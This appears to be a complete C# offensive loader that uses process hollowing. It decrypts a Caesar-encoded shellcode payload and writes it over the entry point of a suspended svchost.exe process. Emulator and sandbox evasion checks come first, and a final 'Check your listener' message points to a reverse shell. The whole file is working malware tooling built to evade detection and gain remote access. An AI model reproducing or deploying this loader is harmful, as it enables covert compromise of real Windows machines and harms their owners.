using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace Hollow_Caesar_ExNuma
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        // VirtualAllocExNuma below
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, UInt32 nndPreferred);

        // PInvoke GetCurrentProcess();
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        /// <summary>
        /// Creating a separate sleep function to wait for 2 milliseconds and see 
        /// if time is modified. If it is then we are likely running in an emulator
        /// so we exit.
        /// </summary>
        /// <returns>-</returns>
        public static Task SleepForEmu()
        {
            DateTime InitTime = DateTime.Now;
            // We can use Thread.Sleep instead of the PInvoke method
            Thread.Sleep(5000);
            // Console.WriteLine($"[+] Time now is: {InitTime}");
            double TimeAfter = DateTime.Now.Subtract(InitTime).TotalSeconds;

            if (TimeAfter < 4.5)
            {
                Console.WriteLine("[-] We are in an emulator/simulator ! Cya ;(");
                return Task.CompletedTask;
            }
            else
            {
                Console.WriteLine("[+] All seems good ! Shouldn't be in an emulator/simulator !");
            }

            return Task.CompletedTask;
        }

        static async Task Main(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            // If API is emulated will not return a mem address, therefore in an emulated environment
            if (mem == null)
            {
                Console.WriteLine("[-] No memory address ! Likely in emulated environment");
                return;
            }
            else
            {
                Console.WriteLine("[+] Memory address exists ! Not in emulated environment");
            }

            await SleepForEmu();

            //Shellcode below
            byte[] buf = new byte[665] { 0xd3, 0x1f, 0x5a, 0xbb, 0xc7, 0xbf, 0xa3, 0xd7, 0xd7, 0xd7, 0x18, 0x28, 0x18, 0x27, 0x29, 0x1f, 0x08, 0xa9, 0x3c, 0x1f, 0x62, 0x29, 0x37, 0x1f, 0x62, 0x29, 0xef, 0x1f, 0x62, 0x29, 0xf7, 0x28, 0x2d, 0x1f, 0xe6, 0x8e, 0x21, 0x21, 0x1f, 0x62, 0x49, 0x27, 0x24, 0x08, 0xa0, 0x1f, 0x08, 0x97, 0x83, 0x13, 0x38, 0x53, 0xd9, 0x03, 0xf7, 0x18, 0x98, 0xa0, 0xe4, 0x18, 0xd8, 0x98, 0xb9, 0xc4, 0x29, 0x1f, 0x62, 0x29, 0xf7, 0x62, 0x19, 0x13, 0x1f, 0xd8, 0xa7, 0x3d, 0x58, 0x4f, 0xef, 0xe2, 0xd9, 0x18, 0x28, 0xe6, 0x5c, 0x49, 0xd7, 0xd7, 0xd7, 0x62, 0x57, 0x5f, 0xd7, 0xd7, 0xd7, 0x1f, 0x5c, 0x97, 0x4b, 0x3e, 0x1f, 0xd8, 0xa7, 0x62, 0x1f, 0xef, 0x1b, 0x62, 0x17, 0xf7, 0x27, 0x20, 0xd8, 0xa7, 0xba, 0x2d, 0x24, 0x08, 0xa0, 0x1f, 0xd6, 0xa0, 0x18, 0x62, 0x0b, 0x5f, 0x1f, 0xd8, 0xad, 0x1f, 0x08, 0x97, 0x18, 0x98, 0xa0, 0xe4, 0x83, 0x18, 0xd8, 0x98, 0x0f, 0xb7, 0x4c, 0xc8, 0x23, 0xda, 0x23, 0xfb, 0xdf, 0x1c, 0x10, 0xa8, 0x4c, 0xaf, 0x2f, 0x1b, 0x62, 0x17, 0xfb, 0x20, 0xd8, 0xa7, 0x3d, 0x18, 0x62, 0xe3, 0x1f, 0x1b, 0x62, 0x17, 0xf3, 0x20, 0xd8, 0xa7, 0x18, 0x62, 0xdb, 0x5f, 0x18, 0x2f, 0x18, 0x2f, 0x35, 0x1f, 0xd8, 0xa7, 0x30, 0x31, 0x18, 0x2f, 0x18, 0x30, 0x18, 0x31, 0x1f, 0x5a, 0xc3, 0xf7, 0x18, 0x29, 0xd6, 0xb7, 0x2f, 0x18, 0x30, 0x31, 0x1f, 0x62, 0xe9, 0xc0, 0x22, 0xd6, 0xd6, 0xd6, 0x34, 0x1f, 0x08, 0xb2, 0x2a, 0x20, 0x95, 0x4e, 0x40, 0x45, 0x40, 0x45, 0x3c, 0x4b, 0xd7, 0x18, 0x2d, 0x1f, 0x60, 0xb8, 0x20, 0x9e, 0x99, 0x23, 0x4e, 0xfd, 0xde, 0xd6, 0xac, 0x2a, 0x2a, 0x1f, 0x60, 0xb8, 0x2a, 0x31, 0x24, 0x08, 0x97, 0x24, 0x08, 0xa0, 0x2a, 0x2a, 0x20, 0x91, 0x11, 0x2d, 0x50, 0x7e, 0xd7, 0xd7, 0xd7, 0xd7, 0xd6, 0xac, 0xbf, 0xe2, 0xd7, 0xd7, 0xd7, 0x08, 0x07, 0x05, 0x08, 0x07, 0x05, 0x07, 0x05, 0x08, 0x07, 0xd7, 0x31, 0x1f, 0x60, 0x98, 0x20, 0x9e, 0x97, 0x92, 0xd8, 0xd7, 0xd7, 0x24, 0x08, 0xa0, 0x2a, 0x2a, 0x41, 0xda, 0x2a, 0x20, 0x91, 0x2e, 0x60, 0x76, 0x9d, 0xd7, 0xd7, 0xd7, 0xd7, 0xd6, 0xac, 0xbf, 0x4a, 0xd7, 0xd7, 0xd7, 0x06, 0x2a, 0x46, 0x2d, 0x3e, 0x38, 0x3a, 0x2f, 0x40, 0x45, 0x4c, 0x2a, 0x1d, 0x0c, 0x30, 0x2b, 0x45, 0x0c, 0x1c, 0x2c, 0x04, 0x4c, 0x28, 0x49, 0x44, 0x04, 0x22, 0x47, 0x2a, 0x21, 0x30, 0x30, 0x09, 0x2a, 0x49, 0x26, 0x24, 0x4f, 0x25, 0x1c, 0x0e, 0x50, 0x3a, 0x0b, 0x45, 0x2c, 0x21, 0x0f, 0x04, 0x44, 0x19, 0x51, 0x2e, 0x31, 0x0e, 0x39, 0x2b, 0x04, 0x1f, 0x48, 0x20, 0x2f, 0x09, 0x3d, 0x4d, 0x28, 0x04, 0x0e, 0x4b, 0x3f, 0x4f, 0x1c, 0x2f, 0x0d, 0x47, 0x40, 0x41, 0x07, 0x0f, 0x1f, 0x08, 0x3d, 0x40, 0x10, 0x26, 0x4d, 0x24, 0x38, 0x36, 0x48, 0x51, 0x0a, 0x18, 0x2a, 0x44, 0x39, 0x22, 0x49, 0x45, 0x4c, 0x51, 0x4f, 0x39, 0x51, 0x50, 0x0c, 0x21, 0x0c, 0x2e, 0x44, 0x18, 0x2a, 0x1b, 0x46, 0xd7, 0x1f, 0x60, 0x98, 0x2a, 0x31, 0x18, 0x2f, 0x24, 0x08, 0xa0, 0x2a, 0x1f, 0x8f, 0xd7, 0x09, 0x7f, 0x5b, 0xd7, 0xd7, 0xd7, 0xd7, 0x27, 0x2a, 0x2a, 0x20, 0x9e, 0x99, 0xc2, 0x2c, 0x05, 0x12, 0xd6, 0xac, 0x1f, 0x60, 0x9d, 0x41, 0xe1, 0x36, 0x1f, 0x60, 0xc8, 0x41, 0xf6, 0x31, 0x29, 0x3f, 0x57, 0x0a, 0xd7, 0xd7, 0x20, 0x60, 0xb7, 0x41, 0xdb, 0x18, 0x30, 0x20, 0x91, 0x4c, 0x1d, 0x75, 0x5d, 0xd7, 0xd7, 0xd7, 0xd7, 0xd6, 0xac, 0x24, 0x08, 0x97, 0x2a, 0x31, 0x1f, 0x60, 0xc8, 0x24, 0x08, 0xa0, 0x24, 0x08, 0xa0, 0x2a, 0x2a, 0x20, 0x9e, 0x99, 0x04, 0xdd, 0xef, 0x52, 0xd6, 0xac, 0x5c, 0x97, 0x4c, 0xf6, 0x1f, 0x9e, 0x98, 0x5f, 0xea, 0xd7, 0xd7, 0x20, 0x91, 0x1b, 0xc7, 0x0c, 0xb7, 0xd7, 0xd7, 0xd7, 0xd7, 0xd6, 0xac, 0x1f, 0xd6, 0xa6, 0x4b, 0xd9, 0xc2, 0x81, 0xbf, 0x2c, 0xd7, 0xd7, 0xd7, 0x2a, 0x30, 0x41, 0x17, 0x31, 0x20, 0x60, 0xa8, 0x98, 0xb9, 0xe7, 0x20, 0x9e, 0x97, 0xd7, 0xe7, 0xd7, 0xd7, 0x20, 0x91, 0x2f, 0x7b, 0x2a, 0xbc, 0xd7, 0xd7, 0xd7, 0xd7, 0xd6, 0xac, 0x1f, 0x6a, 0x2a, 0x2a, 0x1f, 0x60, 0xbe, 0x1f, 0x60, 0xc8, 0x1f, 0x60, 0xb1, 0x20, 0x9e, 0x97, 0xd7, 0xf7, 0xd7, 0xd7, 0x20, 0x60, 0xd0, 0x20, 0x91, 0xe9, 0x6d, 0x60, 0xb9, 0xd7, 0xd7, 0xd7, 0xd7, 0xd6, 0xac, 0x1f, 0x5a, 0x9b, 0xf7, 0x5c, 0x97, 0x4b, 0x89, 0x3d, 0x62, 0xde, 0x1f, 0xd8, 0x9a, 0x5c, 0x97, 0x4c, 0xa9, 0x2f, 0x9a, 0x2f, 0x41, 0xd7, 0x30, 0x20, 0x9e, 0x99, 0xc7, 0x8c, 0x79, 0x2d, 0xd6, 0xac };

            // apply caesar cipher
            Console.WriteLine("[*] Decrypting shellcode");
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 983) & 0xFF);
            }

            //int size = buf.Length;

            try
            {
                STARTUPINFO si = new STARTUPINFO();
                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                bool res = CreateProcess(null,
                "C:\\Windows\\System32\\svchost.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

                if (!res)
                {
                    Console.WriteLine("[-] CreateProcess() has failed to create a process");
                    Environment.Exit(1);
                }
                else
                {
                    Console.WriteLine("[+] CreateProcess() for 'svchost' completed");
                }

                PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
                uint tmp = 0;
                IntPtr hProcess = pi.hProcess;
                //Console.WriteLine($"[INFO] hProcess -> {hProcess}");

                if (true)
                {
                    int queryInfProc = ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
                    Console.WriteLine($"[+] ZwQueryInformationProcess successful for 'svchost'");
                }

                IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

                byte[] addrBuf = new byte[IntPtr.Size];
                IntPtr nRead = IntPtr.Zero;
                bool rProcMem = ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

                if (rProcMem == false)
                {
                    Console.WriteLine("[!] Created process memory could not be read");
                    Environment.Exit(1);
                }

                IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

                byte[] data = new byte[0x200];

                bool svchostProcMem = ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

                if (svchostProcMem == false)
                {
                    Console.WriteLine("[!] Process 'svchost' base address not readable");
                    Environment.Exit(1);
                }

                uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

                uint opthdr = e_lfanew_offset + 0x28;

                uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

                IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

                bool svchostWProcMem = WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

                if (svchostWProcMem == false)
                {
                    Console.WriteLine("[!] Could not replace 'svchost' code with shellcode");
                    Environment.Exit(1);
                }

                Console.WriteLine($"[+] Process 'svchost' h0llowed [ResumeThread()] value -> {ResumeThread(pi.hThread)}");
                Console.WriteLine("[*] Check your listener");
                //ResumeThread(pi.hProcess);
            }
            catch (Exception e)
            {
                throw e;
            }
        }
    }
}
